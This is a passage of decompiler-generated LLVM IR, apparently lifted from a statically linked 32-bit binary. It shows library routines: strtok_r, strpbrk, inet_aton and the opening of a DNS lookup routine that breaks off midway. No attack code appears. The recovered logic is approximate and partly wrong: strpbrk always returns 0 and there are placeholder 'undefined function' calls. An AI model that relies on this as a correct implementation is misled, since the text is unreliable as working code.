  %v4_10012da4 = icmp eq i32 %v4_10012da0, %v1_10012da4
  %v0_10012da8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_10012da4, i32 %v0_10012da8)
  %v0_10012dac = load i32, i32* %ctr.global-to-local, align 4
  %v1_10012dac = add i32 %v0_10012dac, -1
  store i32 %v1_10012dac, i32* %ctr.global-to-local, align 4
  %v2_10012dac = icmp eq i32 %v1_10012dac, 0
  br i1 %v2_10012dac, label %dec_label_pc_10012db0, label %dec_label_pc_10012da0

dec_label_pc_10012db0:                            ; preds = %dec_label_pc_10012da0, %dec_label_pc_10012d94
  store i32 0, i32* %r3.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_10012dac, { 1, 0 }
  uselistorder i32 %v0_10012d94, { 1, 2, 0 }
  uselistorder i32 %v1_10012d90, { 2, 1, 0 }
  uselistorder i32 %v1_10012d40, { 1, 0, 2 }
  uselistorder i32 %v1_10012d38, { 1, 0, 2 }
  uselistorder i32 %v1_10012d28, { 1, 0, 2 }
  uselistorder i32 %v2_10012cfc, { 1, 0 }
  uselistorder i32 %v1_10012cf8, { 1, 0 }
  uselistorder i32 %v0_10012cf4, { 1, 0 }
  uselistorder i32 %v0_10012cf8, { 3, 2, 0, 1 }
  uselistorder i32 %v1_10012cec, { 1, 0 }
  uselistorder i32 %v0_10012ce8, { 1, 0, 2 }
  uselistorder i32 %v2_10012cd0, { 2, 0, 1, 3 }
  uselistorder i32 %v1_10012cc8, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 3, 2, 4, 5, 7, 6, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 9, 5, 2, 3, 4, 6, 7, 8, 10 }
  uselistorder i32* %ctr.global-to-local, { 0, 7, 8, 1, 3, 4, 2, 5, 6 }
  uselistorder i32 %arg3, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_10012da0, { 1, 0 }
  uselistorder label %dec_label_pc_10012d1c, { 1, 0 }
  uselistorder label %dec_label_pc_10012cf0, { 1, 0 }
}

define i32 @strtok_r(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %v0_10012dbc = load i32, i32* @lr, align 4
  store i32 %v0_10012dbc, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* %r31.global-to-local, align 4
  %v3_10012dc4 = icmp eq i32 %arg1, 0
  %v0_10012dcc = load i32, i32* @r5, align 4
  store i32 %v0_10012dcc, i32* %r30.global-to-local, align 4
  %v0_10012dd0 = load i32, i32* @r4, align 4
  store i32 %v0_10012dd0, i32* %r29.global-to-local, align 4
  br i1 %v3_10012dc4, label %dec_label_pc_10012dd8, label %dec_label_pc_10012ddc

dec_label_pc_10012dd8:                            ; preds = %entry
  %v1_10012dd8 = inttoptr i32 %v0_10012dcc to i32*
  %v2_10012dd8 = load i32, i32* %v1_10012dd8, align 4
  store i32 %v2_10012dd8, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10012ddc

dec_label_pc_10012ddc:                            ; preds = %entry, %dec_label_pc_10012dd8
  %v0_10012ddc = phi i32 [ %arg1, %entry ], [ %v2_10012dd8, %dec_label_pc_10012dd8 ]
  store i32 %v0_10012ddc, i32* @r3, align 4
  %v1_10012de0 = inttoptr i32 %v0_10012ddc to i8*
  %v2_10012de0 = call i32 @__GI_strspn(i8* %v1_10012de0)
  %v0_10012de4 = load i32, i32* %r29.global-to-local, align 4
  %v0_10012de8 = load i32, i32* %r31.global-to-local, align 4
  %v2_10012de8 = add i32 %v0_10012de8, %v2_10012de0
  %v3_10012de8 = inttoptr i32 %v2_10012de8 to i8*
  %v4_10012de8 = load i8, i8* %v3_10012de8, align 1
  store i32 %v2_10012de8, i32* @r31, align 4
  store i32 %v2_10012de8, i32* @r3, align 4
  %v3_10012df4 = icmp eq i8 %v4_10012de8, 0
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v3_10012df4, label %dec_label_pc_10012e00, label %dec_label_pc_10012e08

dec_label_pc_10012e00:                            ; preds = %dec_label_pc_10012ddc
  %v1_10012e00 = load i32, i32* %r30.global-to-local, align 4
  %v2_10012e00 = inttoptr i32 %v1_10012e00 to i32*
  store i32 %v2_10012de8, i32* %v2_10012e00, align 4
  br label %dec_label_pc_10012e40

dec_label_pc_10012e08:                            ; preds = %dec_label_pc_10012ddc
  store i32 268512780, i32* @lr, align 4
  %v3_10012e08 = call i32 @__GI_strpbrk(i8* %v3_10012de8, i32 %v0_10012de4)
  %v4_10012e10 = icmp eq i32 %v3_10012e08, 0
  %v0_10012e14 = load i32, i32* @r31, align 4
  store i32 %v0_10012e14, i32* @r3, align 4
  %v2_10012e18 = add i32 %v3_10012e08, 1
  store i32 %v2_10012e18, i32* %r11.global-to-local, align 4
  br i1 %v4_10012e10, label %dec_label_pc_10012e20, label %dec_label_pc_10012e30

dec_label_pc_10012e20:                            ; preds = %dec_label_pc_10012e08
  store i32 268512804, i32* @lr, align 4
  %v4_10012e20 = call i32 @rawmemchr(i32 %v0_10012e14, i32 0, i32 0)
  %v0_10012e24 = load i32, i32* @r31, align 4
  store i32 %v0_10012e24, i32* %r0.global-to-local, align 4
  %v1_10012e28 = load i32, i32* %r30.global-to-local, align 4
  %v2_10012e28 = inttoptr i32 %v1_10012e28 to i32*
  store i32 %v4_10012e20, i32* %v2_10012e28, align 4
  br label %dec_label_pc_10012e40

dec_label_pc_10012e30:                            ; preds = %dec_label_pc_10012e08
  %v1_10012e10 = inttoptr i32 %v3_10012e08 to i8*
  store i8 0, i8* %v1_10012e10, align 1
  %v0_10012e38 = load i32, i32* @r31, align 4
  store i32 %v0_10012e38, i32* %r0.global-to-local, align 4
  %v0_10012e3c = load i32, i32* %r11.global-to-local, align 4
  %v1_10012e3c = load i32, i32* %r30.global-to-local, align 4
  %v2_10012e3c = inttoptr i32 %v1_10012e3c to i32*
  store i32 %v0_10012e3c, i32* %v2_10012e3c, align 4
  br label %dec_label_pc_10012e40

dec_label_pc_10012e40:                            ; preds = %dec_label_pc_10012e20, %dec_label_pc_10012e00, %dec_label_pc_10012e30
  %v0_10012e40 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10012dbc, i32* %r0.global-to-local, align 4
  ret i32 %v0_10012e40

; uselistorder directives
  uselistorder i32 %v3_10012e08, { 2, 0, 1 }
  uselistorder i32 %v2_10012de8, { 0, 2, 1, 3 }
  uselistorder i32 %v0_10012ddc, { 1, 0 }
  uselistorder i32* %r31.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 0, 3, 1, 2, 4, 5 }
  uselistorder label %dec_label_pc_10012e40, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10012ddc, { 1, 0 }
}

define i32 @__GI_strpbrk(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_10012e781 = load i32, i32* @r3, align 4
  %v1_10012e782 = inttoptr i32 %v0_10012e781 to i8*
  %v2_10012e783 = load i8, i8* %v1_10012e782, align 1
  %v3_10012e784 = zext i8 %v2_10012e783 to i32
  store i32 %v3_10012e784, i32* %r11.global-to-local, align 4
  %v3_10012e7c6 = icmp eq i8 %v2_10012e783, 0
  br i1 %v3_10012e7c6, label %dec_label_pc_10012e8c, label %dec_label_pc_10012e84

dec_label_pc_10012e5c:                            ; preds = %dec_label_pc_10012e60
  %v3_10012e60 = zext i8 %v2_10012e60 to i32
  %v4_10012e6c = icmp eq i32 %v3_10012e60, %v1_10012e6c
  %v0_10012e5c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_10012e6c, i32 %v0_10012e5c)
  %v0_10012e60.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_10012e6c.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10012e60

dec_label_pc_10012e60:                            ; preds = %dec_label_pc_10012e84, %dec_label_pc_10012e5c
  %v1_10012e6c = phi i32 [ %v1_10012e6c9, %dec_label_pc_10012e84 ], [ %v1_10012e6c.pre, %dec_label_pc_10012e5c ]
  %v0_10012e60 = phi i32 [ %tmp, %dec_label_pc_10012e84 ], [ %v0_10012e60.pre, %dec_label_pc_10012e5c ]
  %v1_10012e60 = inttoptr i32 %v0_10012e60 to i8*
  %v2_10012e60 = load i8, i8* %v1_10012e60, align 1
  %v1_10012e64 = add i32 %v0_10012e60, 1
  store i32 %v1_10012e64, i32* %r9.global-to-local, align 4
  %v3_10012e68 = icmp eq i8 %v2_10012e60, 0
  br i1 %v3_10012e68, label %dec_label_pc_10012e74, label %dec_label_pc_10012e5c

dec_label_pc_10012e74:                            ; preds = %dec_label_pc_10012e60
  %v0_10012e74 = load i32, i32* @r3, align 4
  %v1_10012e74 = add i32 %v0_10012e74, 1
  store i32 %v1_10012e74, i32* @r3, align 4
  %v1_10012e78 = inttoptr i32 %v1_10012e74 to i8*
  %v2_10012e78 = load i8, i8* %v1_10012e78, align 1
  %v3_10012e78 = zext i8 %v2_10012e78 to i32
  store i32 %v3_10012e78, i32* %r11.global-to-local, align 4
  %v3_10012e7c = icmp eq i8 %v2_10012e78, 0
  br i1 %v3_10012e7c, label %dec_label_pc_10012e8c, label %dec_label_pc_10012e84

dec_label_pc_10012e84:                            ; preds = %entry, %dec_label_pc_10012e74
  %v1_10012e6c9 = phi i32 [ %v3_10012e78, %dec_label_pc_10012e74 ], [ %v3_10012e784, %entry ]
  store i32 %tmp, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10012e60

dec_label_pc_10012e8c:                            ; preds = %dec_label_pc_10012e74, %entry
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_10012e60, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10012e84, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %v3_10012e94 = icmp eq i8* %arg1, null
  br i1 %v3_10012e94, label %dec_label_pc_10012f4c, label %dec_label_pc_10012e9c

dec_label_pc_10012e9c:                            ; preds = %entry
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 0, i32* %r5.global-to-local, align 4
  %v3_10012eb0.pre = load i32, i32* @global_var_1002ab70, align 4
  br label %dec_label_pc_10012eac

dec_label_pc_10012eac:                            ; preds = %dec_label_pc_10012e9c, %dec_label_pc_10012f24
  %v0_10012f24 = phi i32 [ 0, %dec_label_pc_10012e9c ], [ %v2_10012f2c, %dec_label_pc_10012f24 ]
  %v0_10012f28 = phi i32 [ 1, %dec_label_pc_10012e9c ], [ %v1_10012f28, %dec_label_pc_10012f24 ]
  %v0_10012eac = phi i32 [ %tmp, %dec_label_pc_10012e9c ], [ %v0_10012eac3, %dec_label_pc_10012f24 ]
  %v1_10012eac = inttoptr i32 %v0_10012eac to i8*
  %v2_10012eac = load i8, i8* %v1_10012eac, align 1
  %v3_10012eac = zext i8 %v2_10012eac to i32
  %v1_10012eb4 = mul nuw nsw i32 %v3_10012eac, 2
  %v2_10012eb8 = add i32 %v1_10012eb4, %v3_10012eb0.pre
  %v3_10012eb8 = inttoptr i32 %v2_10012eb8 to i16*
  %v4_10012eb8 = load i16, i16* %v3_10012eb8, align 2
  %v1_10012ebc = and i16 %v4_10012eb8, 8
  %v3_10012ebc = icmp eq i16 %v1_10012ebc, 0
  br i1 %v3_10012ebc, label %dec_label_pc_10012f4c, label %dec_label_pc_10012ec4

dec_label_pc_10012ec4:                            ; preds = %dec_label_pc_10012eac
  br label %dec_label_pc_10012edc

dec_label_pc_10012ecc:                            ; preds = %dec_label_pc_10012edc
  %v1_10012ee0 = mul i32 %v1_10012f2c, 10
  %v2_10012ee8 = add i32 %v3_10012edc, %v1_10012ee0
  %v1_10012ecc = add i32 %v2_10012ee8, -48
  %v1_10012ed0 = add i32 %v0_10012f14, 1
  %v2_10012ed4 = icmp sgt i32 %v1_10012ecc, 255
  br i1 %v2_10012ed4, label %dec_label_pc_10012f4c, label %dec_label_pc_10012edc

dec_label_pc_10012edc:                            ; preds = %dec_label_pc_10012ecc, %dec_label_pc_10012ec4
  %v1_10012f2c = phi i32 [ %v1_10012ecc, %dec_label_pc_10012ecc ], [ 0, %dec_label_pc_10012ec4 ]
  %v0_10012f14 = phi i32 [ %v1_10012ed0, %dec_label_pc_10012ecc ], [ %v0_10012eac, %dec_label_pc_10012ec4 ]
  %v1_10012edc = inttoptr i32 %v0_10012f14 to i8*
  %v2_10012edc = load i8, i8* %v1_10012edc, align 1
  %v3_10012edc = zext i8 %v2_10012edc to i32
  %v1_10012ee4 = mul nuw nsw i32 %v3_10012edc, 2
  %v2_10012eec = add i32 %v1_10012ee4, %v3_10012eb0.pre
  %v3_10012eec = inttoptr i32 %v2_10012eec to i16*
  %v4_10012eec = load i16, i16* %v3_10012eec, align 2
  %v5_10012eec = zext i16 %v4_10012eec to i32
  %v1_10012ef0 = and i32 %v5_10012eec, 8
  %v3_10012ef0 = icmp eq i32 %v1_10012ef0, 0
  br i1 %v3_10012ef0, label %dec_label_pc_10012ef8, label %dec_label_pc_10012ecc

dec_label_pc_10012ef8:                            ; preds = %dec_label_pc_10012edc
  %v2_10012ef8 = icmp sgt i32 %v0_10012f28, 3
  br i1 %v2_10012ef8, label %dec_label_pc_10012f10, label %dec_label_pc_10012f00

dec_label_pc_10012f00:                            ; preds = %dec_label_pc_10012ef8
  %v3_10012f00 = icmp eq i8 %v2_10012edc, 46
  br i1 %v3_10012f00, label %dec_label_pc_10012f08, label %dec_label_pc_10012f4c

dec_label_pc_10012f08:                            ; preds = %dec_label_pc_10012f00
  %v1_10012f08 = add i32 %v0_10012f14, 1
  br label %dec_label_pc_10012f24

dec_label_pc_10012f10:                            ; preds = %dec_label_pc_10012ef8
  %v3_10012f10 = icmp eq i8 %v2_10012edc, 0
  %v1_10012f14 = add i32 %v0_10012f14, 1
  br i1 %v3_10012f10, label %dec_label_pc_10012f24, label %dec_label_pc_10012f1c

dec_label_pc_10012f1c:                            ; preds = %dec_label_pc_10012f10
  %v1_10012f1c = and i32 %v5_10012eec, 32
  %v3_10012f1c = icmp eq i32 %v1_10012f1c, 0
  br i1 %v3_10012f1c, label %dec_label_pc_10012f4c, label %dec_label_pc_10012f24

dec_label_pc_10012f24:                            ; preds = %dec_label_pc_10012f1c, %dec_label_pc_10012f10, %dec_label_pc_10012f08
  %v0_10012eac3 = phi i32 [ %v1_10012f14, %dec_label_pc_10012f1c ], [ %v1_10012f14, %dec_label_pc_10012f10 ], [ %v1_10012f08, %dec_label_pc_10012f08 ]
  %v1_10012f24 = mul i32 %v0_10012f24, 256
  %v1_10012f28 = add nuw nsw i32 %v0_10012f28, 1
  %v2_10012f2c = or i32 %v1_10012f2c, %v1_10012f24
  store i32 %v2_10012f2c, i32* %r5.global-to-local, align 4
  %tmp10 = icmp slt i32 %v1_10012f28, 5
  br i1 %tmp10, label %dec_label_pc_10012eac, label %dec_label_pc_10012f38

dec_label_pc_10012f38:                            ; preds = %dec_label_pc_10012f24
  %v0_10012f38 = load i32, i32* @r4, align 4
  %v3_10012f38 = icmp eq i32 %v0_10012f38, 0
  %v0_10012f40 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10012f38, i32 %v0_10012f40)
  %v0_10012f44 = load i32, i32* %r5.global-to-local, align 4
  %v1_10012f44 = load i32, i32* @r4, align 4
  %v2_10012f44 = inttoptr i32 %v1_10012f44 to i32*
  store i32 %v0_10012f44, i32* %v2_10012f44, align 4
  ret i32 1

dec_label_pc_10012f4c:                            ; preds = %dec_label_pc_10012f00, %dec_label_pc_10012f1c, %dec_label_pc_10012eac, %dec_label_pc_10012ecc, %entry
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_10012f2c, { 1, 0 }
  uselistorder i32 %v1_10012f28, { 1, 0 }
  uselistorder i32 %v0_10012f14, { 0, 1, 3, 2 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10012f4c, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_10012eac, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r14.global-to-local = alloca i32, align 4
  %r15.global-to-local = alloca i32, align 4
  %r16.global-to-local = alloca i32, align 4
  %r17.global-to-local = alloca i32, align 4
  %r18.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp28 = call i32 @__decompiler_undefined_function_0()
  %tmp29 = call i32 @__decompiler_undefined_function_0()
  %tmp33 = call i32 @__decompiler_undefined_function_0()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp36 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-248 = alloca i32, align 4
  %stack_var_-212 = alloca i16, align 2
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-240 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-228 = alloca i32, align 4
  %v0_10012f58 = load i32, i32* @lr, align 4
  store i32 %v0_10012f58, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* %r14.global-to-local, align 4
  store i32 %arg2, i32* %r16.global-to-local, align 4
  store i32 %arg3, i32* @r23, align 4
  store i32 268513156, i32* @lr, align 4
  %v1_10012f80 = call i32 @malloc(i32 512)
  store i32 %v1_10012f80, i32* @r30, align 4
  store i32 268513168, i32* @lr, align 4
  %v1_10012f8c = call i32 @malloc(i32 1025)
  %v0_10012f90 = load i32, i32* @r30, align 4
  %v3_10012f90 = icmp eq i32 %v0_10012f90, 0
  store i32 %v1_10012f8c, i32* @r21, align 4
  br i1 %v3_10012f90, label %dec_label_pc_1001354c, label %dec_label_pc_10012f9c

dec_label_pc_10012f9c:                            ; preds = %entry
  %v3_10012f9c = icmp eq i32 %v1_10012f8c, 0
  br i1 %v3_10012f9c, label %dec_label_pc_1001354c, label %dec_label_pc_10012fa4

dec_label_pc_10012fa4:                            ; preds = %dec_label_pc_10012f9c
  %v0_10012fa4 = load i32, i32* @r23, align 4
  %v3_10012fa4 = icmp eq i32 %v0_10012fa4, 0
  br i1 %v3_10012fa4, label %dec_label_pc_1001354c, label %dec_label_pc_10012fac

dec_label_pc_10012fac:                            ; preds = %dec_label_pc_10012fa4
  %v0_10012fac = load i32, i32* %r14.global-to-local, align 4
  %v1_10012fac = inttoptr i32 %v0_10012fac to i8*
  %v2_10012fac = load i8, i8* %v1_10012fac, align 1
  %v3_10012fac = zext i8 %v2_10012fac to i32
  store i32 %v3_10012fac, i32* %r0.global-to-local, align 4
  %v3_10012fb0 = icmp eq i8 %v2_10012fac, 0
  br i1 %v3_10012fb0, label %dec_label_pc_1001354c, label %dec_label_pc_10012fb8

dec_label_pc_10012fb8:                            ; preds = %dec_label_pc_10012fac
  store i32 %v0_10012fac, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r29.global-to-local, align 4
  %v0_10012fc0 = call i32 @__GI_strlen()
  %v0_10012fc8 = load i32, i32* %r14.global-to-local, align 4
  %v2_10012fc8 = add i32 %v0_10012fc8, %v0_10012fc0
  %v1_10012fd0 = add i32 %v2_10012fc8, -1
  %v2_10012fd0 = inttoptr i32 %v1_10012fd0 to i8*
  %v3_10012fd0 = load i8, i8* %v2_10012fd0, align 1
  %v4_10012fd0 = zext i8 %v3_10012fd0 to i32
  store i32 %v4_10012fd0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10030e50.679 to i32), i32* %r29.global-to-local, align 4
  %v2_10012fd8 = ptrtoint i32* %stack_var_-228 to i32
  store i32 %v2_10012fd8, i32* %r28.global-to-local, align 4
  store i32 %v2_10012fd8, i32* @r3, align 4
  %v1_10012fe4 = xor i32 %v4_10012fd0, 46
  store i32 %v1_10012fe4, i32* %r17.global-to-local, align 4
  %v0_10012fe8 = call i32 @__pthread_return_void()
  %v0_10012ff0 = call i32 @__pthread_return_0()
  %v3_10012ff8 = load i32, i32* @global_var_1002ac10.680, align 4
  store i32 %v3_10012ff8, i32* %r11.global-to-local, align 4
  %v3_10013004 = load i16, i16* @global_var_1002ab24.681, align 2
  %v4_10013004 = zext i16 %v3_10013004 to i32
  store i32 %v4_10013004, i32* @r25, align 4
  %v1_10013008 = load i32, i32* @r23, align 4
  store i32 %v2_10012fd8, i32* @r3, align 4
  store i32 0, i32* %r17.global-to-local, align 4
  store i32 -1, i32* @r19, align 4
  store i32 0, i32* %r18.global-to-local, align 4
  store i32 -1, i32* @r22, align 4
  %v2_10013008 = srem i32 %v3_10012ff8, %v1_10013008
  %v2_10013024 = sub i32 %v3_10012ff8, %v2_10013008
  store i32 %v2_10013024, i32* %r0.global-to-local, align 4
  store i32 %v2_10013008, i32* @r26, align 4
  %v0_1001302c = call i32 @__pthread_return_void()
  %v0_10013540.pr19 = load i32, i32* %r18.global-to-local, align 4
  %tmp57 = icmp ult i32 %v0_10013540.pr19, 3
  br i1 %tmp57, label %dec_label_pc_10013034.lr.ph.lr.ph, label %dec_label_pc_10013558

dec_label_pc_10013034.lr.ph.lr.ph:                ; preds = %dec_label_pc_10012fb8
  %v2_1001304c = ptrtoint i32* %stack_var_-144 to i32
  %v2_10013160 = ptrtoint i32* %stack_var_-204 to i32
  %v2_100131c0 = ptrtoint i16* %stack_var_-212 to i32
  %v2_10013204 = ptrtoint i32* %stack_var_-248 to i32
  %v3_10013260 = icmp eq i32 %tmp37, 0
  %v3_1001326c = icmp eq i32 %tmp36, 3
  %v2_100132e8 = icmp sgt i32 %tmp35, 0
  %tmp58 = icmp slt i32 %tmp35, 1
  %v2_1001333c = ptrtoint i32* %stack_var_-184 to i32
  %v3_10013368 = icmp eq i32 %tmp33, 0
  %v3_100132dc = icmp eq i32 %tmp36, 0
  br label %dec_label_pc_10013034.lr.ph

dec_label_pc_10013034:                            ; preds = %dec_label_pc_10013034.lr.ph, %dec_label_pc_100131e4
  %v0_10013034 = load i32, i32* @r19, align 4
  %v3_10013034 = icmp eq i32 %v0_10013034, -1
  br i1 %v3_10013034, label %dec_label_pc_10013044, label %dec_label_pc_1001303c

dec_label_pc_1001303c:                            ; preds = %dec_label_pc_10013034
  store i32 268513348, i32* @lr, align 4
  %v1_10013040 = call i32 @__libc_close(i32 %v0_10013034)
  br label %dec_label_pc_10013044

dec_label_pc_10013044:                            ; preds = %dec_label_pc_10013034, %dec_label_pc_1001303c
  store i32 %v2_1001304c, i32* %r29.global-to-local, align 4
  %v0_10013050 = load i32, i32* @r30, align 4
  store i32 268513368, i32* @lr, align 4
  %v3_10013054 = call i32 @__GI_memset(i32 %v0_10013050, i32 0, i32 512)
  store i32 268513384, i32* @lr, align 4
  %v3_10013064 = call i32 @__GI_memset(i32 %v2_1001304c, i32 0, i32 48)
  %v0_10013068 = load i32, i32* @r25, align 4
  %v1_10013068 = add i32 %v0_10013068, 1
  %v1_1001306c = urem i32 %v1_10013068, 65536
  store i32 %v1_1001306c, i32* @r25, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_10013078 = load i32, i32* @r30, align 4
  store i32 %v1_1001306c, i32* %stack_var_-144, align 4
  %v4_1001308c = call i32 @__encode_header(i32* nonnull %stack_var_-144, i32 %v0_10013078, i32 512)
  store i32 %v4_1001308c, i32* %r28.global-to-local, align 4
  %v1_10013090 = icmp slt i32 %v4_1001308c, 0
  br i1 %v1_10013090, label %dec_label_pc_10013558, label %dec_label_pc_10013098

dec_label_pc_10013098:                            ; preds = %dec_label_pc_10013044
  %v0_10013098 = load i32, i32* %r14.global-to-local, align 4
  store i32 %v0_10013098, i32* @r4, align 4
  %v0_100130a0 = load i32, i32* @r21, align 4
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r29.global-to-local, align 4
  store i32 268513452, i32* @lr, align 4
  %v4_100130a8 = call i32 @strncpy(i32 %v0_100130a0, i32 %v0_10013098, i32 1025)
  store i32 ptrtoint (i32* @global_var_1002ab28.628 to i32), i32* %r29.global-to-local, align 4
  store i32 %v2_10012fd8, i32* @r3, align 4
  %v0_100130c0 = call i32 @__pthread_return_void()
  %v0_100130c8 = call i32 @__pthread_return_0()
  %v0_100130cc = load i32, i32* @r22, align 4
  %v1_100130cc = icmp slt i32 %v0_100130cc, 0
  %v0_100130d4 = load i32, i32* @r26, align 4
  %v1_100130d4 = mul i32 %v0_100130d4, 4
  store i32 %v1_100130d4, i32* %r0.global-to-local, align 4
  %v2_100130d8 = add i32 %v1_100130d4, %arg4
  %v3_100130d8 = inttoptr i32 %v2_100130d8 to i32*
  %v4_100130d8 = load i32, i32* %v3_100130d8, align 4
  store i32 %v4_100130d8, i32* %r29.global-to-local, align 4
  br i1 %v1_100130cc, label %dec_label_pc_10013120, label %dec_label_pc_100130e0

dec_label_pc_100130e0:                            ; preds = %dec_label_pc_10013098
  %v3_100130e4 = load i32, i32* @global_var_1002ac18.683, align 4
  store i32 %v3_100130e4, i32* %r0.global-to-local, align 4
  %v2_100130e8 = icmp slt i32 %v0_100130cc, %v3_100130e4
  br i1 %v2_100130e8, label %dec_label_pc_100130f0, label %dec_label_pc_10013120

dec_label_pc_100130f0:                            ; preds = %dec_label_pc_100130e0
  store i32 ptrtoint (i32* @global_var_1001a5f8.684 to i32), i32* @r4, align 4
  %v0_100130fc = load i32, i32* @r21, align 4
  store i32 268513540, i32* @lr, align 4
  %v4_10013100 = inttoptr i32 %v0_100130fc to i8*
  %v5_10013100 = call i32 @__GI_strncat(i8* %v4_10013100, i32 ptrtoint (i32* @global_var_1001a5f8.684 to i32), i32 1025, i32 ptrtoint (i32* @global_var_10030000.1 to i32))
  %v0_10013108 = load i32, i32* @r22, align 4
  %v1_10013108 = mul i32 %v0_10013108, 4
  store i32 %v1_10013108, i32* %r0.global-to-local, align 4
  %v2_10013110 = add i32 %v1_10013108, ptrtoint (i32* @global_var_10030f00.685 to i32)
  %v3_10013110 = inttoptr i32 %v2_10013110 to i32*
  %v4_10013110 = load i32, i32* %v3_10013110, align 4
  store i32 %v4_10013110, i32* @r4, align 4
  %v0_10013114 = load i32, i32* @r21, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10013120.686 to i32), i32* @lr, align 4
  %v4_1001311c = inttoptr i32 %v0_10013114 to i8*
  %v5_1001311c = call i32 @__GI_strncat(i8* %v4_1001311c, i32 %v4_10013110, i32 1025, i32 ptrtoint (i32* @global_var_10030f00.685 to i32))
  br label %dec_label_pc_10013120

dec_label_pc_10013120:                            ; preds = %dec_label_pc_100130e0, %dec_label_pc_10013098, %dec_label_pc_100130f0
  store i32 %v2_10012fd8, i32* @r3, align 4
  %v0_10013128 = call i32 @__pthread_return_void()
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_10013134 = load i32, i32* @r30, align 4
  %v1_10013134 = load i32, i32* %r28.global-to-local, align 4
  %v2_10013134 = add i32 %v1_10013134, %v0_10013134
  %v1_10013138 = sub i32 512, %v1_10013134
  %v0_10013140 = load i32, i32* @r21, align 4
  store i32 %v0_10013140, i32* %stack_var_-240, align 4
  store i32 268513612, i32* @lr, align 4
  %v4_10013148 = call i32 @__encode_question(i32* nonnull %stack_var_-240, i32 %v2_10013134, i32 %v1_10013138)
  store i32 %v4_10013148, i32* @r27, align 4
  %v1_1001314c = icmp slt i32 %v4_10013148, 0
  br i1 %v1_1001314c, label %dec_label_pc_10013558, label %dec_label_pc_10013154

dec_label_pc_10013154:                            ; preds = %dec_label_pc_10013120
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_1001315c = load i32, i32* @r29, align 4
  store i16 2, i16* %stack_var_-212, align 2
  store i32 268513644, i32* @lr, align 4
  %v3_10013168 = inttoptr i32 %v0_1001315c to i8*
  %v4_10013168 = call i32 @inet_pton(i32 10, i8* %v3_10013168, i32 %v2_10013160)
  %tmp59 = icmp slt i32 %v4_10013168, 1
  br i1 %tmp59, label %dec_label_pc_1001317cthread-pre-split, label %dec_label_pc_10013174

dec_label_pc_10013174:                            ; preds = %dec_label_pc_10013154
  store i32 10, i32* %r0.global-to-local, align 4
  store i16 10, i16* %stack_var_-212, align 2
  br label %dec_label_pc_1001317c

dec_label_pc_1001317cthread-pre-split:            ; preds = %dec_label_pc_10013154
  %v3_1001317c.pr = load i16, i16* %stack_var_-212, align 2
  br label %dec_label_pc_1001317c

dec_label_pc_1001317c:                            ; preds = %dec_label_pc_1001317cthread-pre-split, %dec_label_pc_10013174
  %v3_1001317c = phi i16 [ %v3_1001317c.pr, %dec_label_pc_1001317cthread-pre-split ], [ 10, %dec_label_pc_10013174 ]
  %v3_10013180 = icmp eq i16 %v3_1001317c, 10
  store i32 53, i32* %r0.global-to-local, align 4
  br i1 %v3_10013180, label %dec_label_pc_100131a8, label %dec_label_pc_10013194

dec_label_pc_10013194:                            ; preds = %dec_label_pc_1001317c
  %v0_10013198 = load i32, i32* @r29, align 4
  store i32 268513700, i32* @lr, align 4
  %v1_100131a0 = call i32 @inet_addr(i32 %v0_10013198)
